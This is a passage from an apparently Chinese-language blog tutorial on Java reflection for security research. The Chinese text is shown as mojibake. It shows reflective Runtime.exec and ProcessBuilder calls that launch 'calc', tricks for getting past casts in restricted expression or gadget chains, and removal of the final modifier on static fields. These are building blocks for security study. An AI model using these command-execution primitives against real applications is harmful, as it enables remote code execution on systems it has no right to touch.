(Runtime) getRuntimeMethod.invoke(<span class="literal">null</span>);</span><br><span class="line">execMethod.invoke(runtime,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-getConstructorä¸newInstance"><a href="#3-getConstructorä¸newInstance" class="headerlink" title="3.getConstructorä¸newInstance()"></a>3.<code>getConstructor</code>ä¸<code>newInstance()</code></h3><p>**<code>getConstructor</code><strong>çš„ä½œç”¨æ˜¯ä»ç±»å¯¹è±¡ä¸­è·å–ä¸€ä¸ª</strong>å…¬æœ‰çš„ï¼ˆpublicï¼‰**æ„é€ å‡½æ•°å¯¹è±¡ï¼ˆConstructorï¼‰ã€‚</p><p>å‚æ•°è¯¦è§£ï¼šä»£è¡¨å¯¹åº”æ„é€ å™¨å‚æ•°åˆ—è¡¨ï¼Œä¾‹å¦‚ï¼š<code>clazz.getConstructor(String.class, int.class)</code></p><p>**<code>newInstance()</code>**çš„ä½œç”¨æ‰§è¡Œè¿™ä¸ªæ„é€ å‡½æ•°ï¼Œ<strong>åœ¨å†…å­˜ä¸­åˆ›å»ºå‡ºè¯¥ç±»çš„å®ä¾‹</strong>ï¼ˆä¹Ÿå°±æ˜¯ new äº†ä¸€ä¸ªå¯¹è±¡ï¼‰ã€‚</p><p>å‚æ•°è¯¦è§£ï¼šå®ƒæ¥æ”¶çš„å‚æ•°æ˜¯ <strong>å¯å˜å‚æ•°ï¼ˆObjectâ€¦ï¼‰</strong>ï¼Œè¿™é‡Œä¼ å…¥çš„æ˜¯<strong>çœŸæ­£çš„å€¼</strong>ï¼Œè€Œä¸æ˜¯ç±»å‹ï¼Œéœ€è¦ä¸æ„é€ å™¨ä¸€ä¸€å¯¹åº”ã€‚</p><ul><li><p><strong>Classä¸­newInstanceä¸ReflectåŒ…ä¸‹çš„newinstance</strong></p><p>Classä¸­ç›´æ¥è°ƒç”¨newinstanceçš„å·²ç»å¼ƒç”¨ï¼Œå¤§æ¦‚ç¼ºç‚¹å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512312322032.png" alt="image-20251212180352614"></p></li><li><p><strong>ç»•è¿‡ç±»å‹è½¬æ¢</strong></p><p>åŸå§‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc&quot;</span>))).start();</span><br><span class="line">å¾ˆå¤šè¡¨è¾¾å¼è¯­è¨€ï¼ˆæˆ–è€…æ„é€ çš„åˆ©ç”¨é“¾å·¥å…·ï¼Œå¦‚ Transformer é“¾ï¼‰**è¯­æ³•æ˜¯é˜‰å‰²ç‰ˆæˆ–è€…å—é™çš„**ã€‚å®ƒä»¬å¯èƒ½ï¼š</span><br></pre></td></tr></table></figure><ol><li><strong>æ ¹æœ¬æ²¡æœ‰è®¾è®¡ (Type) è¿™ç§å¼ºè½¬è¯­æ³•</strong>ã€‚</li><li>æˆ–è€…æ˜¯åœ¨æ„é€ ä¸€ä¸ªå¯¹è±¡é“¾ï¼ˆChainï¼‰ï¼Œè€Œä¸æ˜¯å†™ä»£ç ï¼Œé“¾æ¡é‡Œæ¯ä¸€ä¸ªç¯èŠ‚åªèƒ½ä¼ é€’ Objectã€‚</li></ol><p>ç»•è¿‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>); clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc&quot;</span>)));</span><br></pre></td></tr></table></figure><p><strong>ç›¸å½“äºæ‰¾åˆ° <code>ProcessBuilder</code> ç±»é‡Œçš„ start æ–¹æ³•ã€‚ç„¶åï¼Œç›´æ¥æŠŠè¿™ä¸ª start æ–¹æ³•åº”ç”¨åœ¨ obj å¯¹è±¡ä¸Šæ‰§è¡Œï¼</strong></p></li><li><p><strong>newinstanceä¸­è‡ªåŠ¨è§£åŒ…é€ æˆçš„é—®é¢˜</strong></p><p>åœ¨åå°„åˆ›å»ºå¯¹è±¡ä½¿ç”¨<code>ProcessBuilder</code>ä¸­å¯å˜å‚æ•°ä¼ å‚æ—¶ï¼Œä¼šå¯¼è‡´<code>newInstance</code>ä¸æ„é€ æ–¹æ³•å‘ç”Ÿå†²çª</p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512312322684.png" alt="image-20251212182434978"  /><p>æ‰€ä»¥æˆ‘ä»¬è¿›è¡ŒäºŒç»´æ•°ç»„æ­£ç¡®å†™æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;));</span><br></pre></td></tr></table></figure></li></ul><h3 id="4-getDeclared-ç³»åˆ—"><a href="#4-getDeclared-ç³»åˆ—" class="headerlink" title="4.getDeclared ç³»åˆ—"></a>4.<code>getDeclared </code>ç³»åˆ—</h3><p><code>getDeclared ç³»åˆ— (getDeclaredMethod, getDeclaredField, getDeclaredConstructor)</code></p><ul><li><strong>æƒé™ï¼š</strong> è·å–è¯¥ç±»å£°æ˜çš„<strong>æ‰€æœ‰</strong>æˆå‘˜ï¼ˆPublic, Protected, Default, <strong>Private</strong> å…¨éƒ¨éƒ½èƒ½æ‹¿åˆ°ï¼‰ã€‚</li><li><strong>èŒƒå›´ï¼š</strong> <strong>åªçœ‹å½“å‰ç±»è‡ªå·±å†™çš„</strong>ï¼Œ<strong>ä¸åŒ…æ‹¬</strong>ä»çˆ¶ç±»ç»§æ‰¿ä¸‹æ¥çš„ä»»ä½•ä¸œè¥¿ã€‚</li></ul><p><code>setAccessible(true)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class.getDeclaredConstructor();</span><br><span class="line">c.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) c.newInstance();</span><br></pre></td></tr></table></figure><h2 id="ä¸‰ã€javaåå°„ä¸­ä¸€äº›å°çŸ¥è¯†"><a href="#ä¸‰ã€javaåå°„ä¸­ä¸€äº›å°çŸ¥è¯†" class="headerlink" title="ä¸‰ã€javaåå°„ä¸­ä¸€äº›å°çŸ¥è¯†"></a>ä¸‰ã€javaåå°„ä¸­ä¸€äº›å°çŸ¥è¯†</h2><h3 id="1-Classç±»"><a href="#1-Classç±»" class="headerlink" title="1.Classç±»"></a>1.<code>Class</code>ç±»</h3><p>åœ¨ Java ä¸­ï¼Œä¸‡ç‰©çš†å¯¹è±¡ã€‚æ‰€ä»¥ï¼Œ<strong>â€œç±»â€æœ¬èº«å°±æ˜¯å¯¹è±¡</strong></p><ul><li>å½“æˆ‘ä»¬ç¼–å†™ä¸€ä¸ª <code>Person.java</code> æ–‡ä»¶å¹¶ç¼–è¯‘æˆ<code>Person.class</code>å­—èŠ‚ç æ–‡ä»¶åã€‚</li><li>å½“<code> JVM</code>ï¼ˆJavaè™šæ‹Ÿæœºï¼‰å¯åŠ¨å¹¶åŠ è½½è¿™ä¸ª .class æ–‡ä»¶æ—¶ï¼Œ<code>JVM </code>ä¼šåœ¨å†…å­˜ä¸­åˆ›å»ºä¸€ä¸ªå¯¹åº”çš„ <strong><code>java.lang.Class </code>å¯¹è±¡</strong>ã€‚</li><li>è¿™ä¸ªå¯¹è±¡åŒ…å«äº†<code>Person</code>ç±»çš„æ‰€æœ‰å…ƒä¿¡æ¯ï¼ˆç±»åã€åŒ…åã€æœ‰å“ªäº›æ–¹æ³•ã€æœ‰å“ªäº›å­—æ®µã€æ„é€ å‡½æ•°æ˜¯ä»€ä¹ˆç­‰ç­‰ï¼‰ã€‚</li></ul><p>Person æ˜¯æˆ‘ä»¬å®šä¹‰çš„ä¸€ä¸ªç±»ï¼Œç”¨æ¥åˆ›å»º p1, p2 å®ä¾‹ã€‚<br>è€Œ Class ç±»æ˜¯ç”¨æ¥æè¿° Person è¿™ä¸ªç±»çš„ã€‚<strong>å®ƒæ˜¯â€œç±»çš„ç±»â€ã€‚</strong></p><p><strong>è·å– Class å¯¹è±¡çš„ä¸‰ç§æ–¹å¼</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Object.getClass()</span><br><span class="line">    String str = &quot;Hello&quot;;</span><br><span class="line">    Class&lt;?&gt; clazz = str.getClass()</span><br><span class="line">.class é™æ€è¯­æ³•</span><br><span class="line">    Class&lt;?&gt; clazz = String.class;</span><br><span class="line">    Class&lt;?&gt; intClass = int.class; // åŸºæœ¬æ•°æ®ç±»å‹ä¹Ÿæœ‰ Class å¯¹è±¡</span><br><span class="line">Class.forName(&quot;å…¨é™å®šç±»å&quot;) </span><br><span class="line">    Class&lt;?&gt; clazz = Class.forName(&quot;java.net.URL&quot;);</span><br></pre></td></tr></table></figure><h3 id="2-åå°„ä¿®æ”¹staticã€finalä¿®é¥°çš„å­—æ®µ"><a href="#2-åå°„ä¿®æ”¹staticã€finalä¿®é¥°çš„å­—æ®µ" class="headerlink" title="2.åå°„ä¿®æ”¹staticã€finalä¿®é¥°çš„å­—æ®µ"></a>2.åå°„ä¿®æ”¹staticã€finalä¿®é¥°çš„å­—æ®µ</h3><ul><li><p><strong>static</strong></p><ol><li><strong>å‚æ•°ä¼  null</strong>ï¼š<code>field.set(null, val)</code>ã€‚</li><li><strong>æƒé™æ§åˆ¶</strong>ï¼šå¦‚æœå­—æ®µæ˜¯ <code>private</code>ï¼Œå¿…é¡»è°ƒç”¨ <code>setAccessible(true)</code>ã€‚</li><li><strong>å½±å“èŒƒå›´</strong>ï¼šä¿®æ”¹åï¼Œæ•´ä¸ª <code>JVM </code>è¿›ç¨‹ä¸­ï¼Œæ‰€æœ‰ä½¿ç”¨è¯¥ç±»çš„åœ°æ–¹è·å–åˆ°çš„å€¼éƒ½ä¼šæ”¹å˜ï¼ˆå› ä¸ºæ˜¯å…¨å±€å…±äº«çš„ï¼‰</li></ol></li><li><p><strong>final</strong></p><ol><li><strong>å¿…é¡» <code>setAccessible(true)</code></strong>ï¼šå“ªæ€•æ˜¯ <code>public final</code>ï¼Œæƒ³æ”¹å€¼ä¹Ÿå¿…é¡»åŠ è¿™ä¸€è¡Œï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚</li><li><strong>å¸¸é‡æŠ˜å ï¼ˆå†…è”ï¼‰</strong>ï¼šå¦‚æœ final å­—æ®µæ˜¯åŸºæœ¬æ•°æ®ç±»å‹æˆ– String å­—é¢é‡ï¼Œä¸”åœ¨å£°æ˜æ—¶èµ‹å€¼ï¼Œåå°„ä¿®æ”¹è™½ç„¶æˆåŠŸä¿®æ”¹äº†å†…å­˜ï¼Œä½†å¯¹å·²æœ‰ä»£ç å¯èƒ½<strong>ä¸å¯è§</strong>ã€‚</li></ol><p><strong>æœ‰æ•ˆåœºæ™¯</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InDirectPerson</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">StringBuilder</span> <span class="variable">sex</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;male&quot;</span>);  </span><br><span class="line">    <span class="comment">// ç»è¿‡é€»è¾‘åˆ¤æ–­äº§ç”Ÿçš„å˜é‡èµ‹å€¼  </span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> (<span class="literal">null</span>!=<span class="literal">null</span>?<span class="number">18</span>:<span class="number">18</span>);  </span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">final</span> String name;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InDirectPerson</span><span class="params">()</span>&#123;  </span><br><span class="line">        name = <span class="string">&quot;Drunkbaby&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>static + final</strong></p><p>å¯¹äº <code>static final </code>å­—æ®µï¼ŒJava åœ¨è®¾è®¡ä¸Šæ˜¯ä¸å…è®¸ä¿®æ”¹çš„</p><ol><li><strong>åå°„æ£€æŸ¥ï¼ˆ<code>Runtime Check</code>ï¼‰ï¼š</strong><br>å½“ä½ å°è¯•è°ƒç”¨ <code>field.set(null, newValue)</code> ä¿®æ”¹ä¸€ä¸ªåŒæ—¶è¢«<code> static å’Œ final</code> ä¿®é¥°çš„å­—æ®µæ—¶ï¼Œ<code>JDK </code>çš„åå°„å®ç°ä¼šæ˜¾å¼æ£€æŸ¥ï¼šå¦‚æœä¸å»é™¤ final ä¿®é¥°ç¬¦ï¼Œå®ƒä¼šç›´æ¥æŠ›å‡º <code>IllegalAccessException</code>ã€‚</li><li><strong>ç¼–è¯‘å™¨å†…è”ï¼ˆ<code>Compile-time Inlining</code>ï¼‰ï¼š</strong><br>å¦‚æœå­—æ®µæ˜¯<strong>ç¼–è¯‘æœŸå¸¸é‡</strong>ï¼Œç¼–è¯‘å™¨ä¼šå°†å¼•ç”¨è¯¥å­—æ®µçš„åœ°æ–¹ç›´æ¥æ›¿æ¢ä¸ºå…·ä½“çš„å€¼ã€‚</li></ol><p><strong>ç»•è¿‡ä¿®æ”¹æ–¹æ³•</strong></p><ol><li>è·å–å­—æ®µçš„ Field å¯¹è±¡ã€‚</li><li><strong>ä¿®æ”¹ Field å¯¹è±¡è‡ªèº«çš„ modifiers å±æ€§</strong>ï¼ŒæŠŠ FINAL çš„æ ‡å¿—ä½æŠ¹å»ã€‚ä½¿å…¶çœ‹èµ·æ¥åƒæ˜¯ä¸€ä¸ªæ™®é€šçš„ static å­—æ®µã€‚</li><li>é‡æ–°èµ‹å€¼ã€‚</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MagicReflection</span> &#123;</span><br><span class="line">    <span class="comment">// åœºæ™¯ Bï¼šé—´æ¥èµ‹å€¼ï¼ˆè¿è¡ŒæœŸç¡®å®šï¼‰- å¯¹è±¡ã€æ–¹æ³•è¿”å›å€¼ã€æ„é€ å—</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">INDIRECT_VAL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Old Value&quot;</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ä¿®æ”¹å‰ Indirect: &quot;</span> + INDIRECT_VAL);</span><br><span class="line">        modifyStaticFinalField(<span class="string">&quot;INDIRECT_VAL&quot;</span>, <span class="string">&quot;New Value&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;ä¿®æ”¹å Indirect: &quot;</span> + INDIRECT_VAL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">modifyStaticFinalField</span><span class="params">(String fieldName, Object newValue)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. è·å–ç›®æ ‡å­—æ®µ</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">targetField</span> <span class="operator">=</span> MagicReflection.class.getDeclaredField(fieldName);</span><br><span class="line">        targetField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. è·å– Field ç±»ä¸­çš„ modifiers å­—æ®µ</span></span><br><span class="line">        <span class="comment">// è¿™ä¸€æ­¥æ˜¯ä¸ºäº†å»é™¤ targetField çš„ final å±æ€§</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. å»æ‰ final ä¿®é¥°ç¬¦ (ä½¿ç”¨ä½è¿ç®— &amp; ~Modifier.FINAL)</span></span><br><span class="line">        modifiersField.setInt(targetField, targetField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. è®¾ç½®æ–°å€¼</span></span><br><span class="line">        targetField.set(<span class="literal">null</span>, newValue);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaå®‰å…¨ </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
